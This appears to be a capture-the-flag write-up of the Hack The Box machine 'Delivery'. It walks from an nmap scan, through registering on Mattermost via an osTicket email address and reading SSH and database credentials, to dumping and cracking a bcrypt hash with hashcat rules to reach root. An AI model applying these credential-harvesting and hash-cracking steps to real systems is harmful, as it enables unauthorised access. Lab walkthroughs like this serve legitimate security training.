# Delivery

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC -T4 -p- -sV delivery.htb
Starting Nmap 7.95 ( <https://nmap.org> ) at 2025-10-20 19:11 EDT
Nmap scan report for delivery.htb (10.10.10.222)
Host is up (0.11s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)
80/tcp   open  http    nginx 1.14.2
|_http-title: Welcome
|_http-server-header: nginx/1.14.2
8065/tcp open  http    Golang net/http server
```

We have the main page. There is nothing on it, just a link to helpdesk

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FwvtWB0IPtMrjydKhSFRp%2Fimage.png?alt=media&#x26;token=a0cb3a62-5b59-4540-b9ea-edc3e5a61988" alt=""><figcaption></figcaption></figure>

We are redirected to a OsTicket panel

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FinqtvZUpa1it624eZSvg%2Fimage.png?alt=media&#x26;token=ab9cddc8-89dc-4542-aa77-b3867b664e38" alt=""><figcaption></figcaption></figure>

We can use it to create a new ticket

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F2CZCxxg8yVeABvZUdBJT%2Fimage.png?alt=media&#x26;token=edec81fa-7ca1-49e7-b067-db9e5620ad26" alt=""><figcaption></figcaption></figure>

Creating a ticket gives us a ticket number and an email to contact to follow up on the ticket

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2F6k2QVcNStQf4N0b823tW%2Fimage.png?alt=media&#x26;token=13582e7b-830e-4ebe-9ace-be4f4173e975" alt=""><figcaption></figcaption></figure>

Here we see the communication interface for this particular ticket

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FGSSZVSHh9HhPLjPkH08J%2Fimage.png?alt=media&#x26;token=e06b7d7e-96d1-4f95-ab54-cf83c7051e19" alt=""><figcaption></figcaption></figure>

On port 8065, we have the mattermost service, which is like slack. We need a .delivery.htb to register, so we can use the previous email (from the ticket) because we will be able to see it from the communication interface

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FXhm6ONimfbzSlvtIkxSb%2Fimage.png?alt=media&#x26;token=0819eba2-aa5b-495a-abd0-544213bb2eaf" alt=""><figcaption></figcaption></figure>

We register

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FjUSetK9Cf0VX3qzGJMSM%2Fimage.png?alt=media&#x26;token=f85f2ac5-c95f-4734-863e-3e87b8bb2e4e" alt=""><figcaption></figcaption></figure>

We get the confirmation link

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2Ffu9scVolwnkA7o4Vhuew%2Fimage.png?alt=media&#x26;token=0f8e2c98-aca7-4587-a037-31a432316821" alt=""><figcaption></figcaption></figure>

We can verifiate our account

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FHaVYvOkfrKbMSBq0JVSZ%2Fimage.png?alt=media&#x26;token=c3c1d470-d897-44b1-b435-687626b3d6cc" alt=""><figcaption></figcaption></figure>

We have access to the internal communication canal

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FYapvDzPVb4mxY4L7YN0L%2Fimage.png?alt=media&#x26;token=b2319149-e5a9-4b90-ae1d-93d0429d3c53" alt=""><figcaption></figcaption></figure>

We get informations on a password and credentials for SSH

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMG28vus48dEbkwfx7oR5%2Fimage.png?alt=media&#x26;token=a1b014dd-fed9-4801-83d7-0436d04685db" alt=""><figcaption></figcaption></figure>

```bash
maildeliverer:Youve_G0t_Mail! 
PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
```

We see as maildelivery

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ ssh maildeliverer@delivery.htb        
The authenticity of host 'delivery.htb (10.10.10.222)' can't be established.
ED25519 key fingerprint is SHA256:AGdhHnQ749stJakbrtXVi48e6KTkaMj/+QNYMW+tyj8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'delivery.htb' (ED25519) to the list of known hosts.
maildeliverer@delivery.htb's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$
```

In /opt/matermost/config/config.json we find creds for DB

<figure><img src="https://2006144298-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FBVYdRQWhXrZbqzYeOYpH%2Fuploads%2FMGNOS1Vpcb0MsWr0yFlu%2Fimage.png?alt=media&#x26;token=cb885fd3-cf86-4f1c-aaff-e02a101db6a6" alt=""><figcaption></figcaption></figure>

mmuser:Crack\_The\_MM\_Admin\_PW

In the DB we get the hash for the root user

```bash
maildeliverer@Delivery:/opt/mattermost/config$ mysql -u mmuser -p

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+

MariaDB [mattermost]> show tables;
MariaDB [mattermost]> select * from Users;

root:$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
```

We know from the text that the password isn”t in the classic rockyou.txt file. So we need to use rules. We can apply the hashcat best64.rule, which is the go to

```bash
hashcat --force pass -r /usr/share/hashcat/rules/best64.rule --stdout | sort -u > modif2
```

Then try it to crack the hash

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ hashcat -m 3200 hash modif2

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

root:PleaseSubscribe!21
```

Then su into root

```bash
maildeliverer@Delivery:/opt/mattermost/config$ su - root
Password: 
root@Delivery:~# cat /root/root.txt 
4980cbf0585db478778218a3524f4779
root@Delivery:~#
```
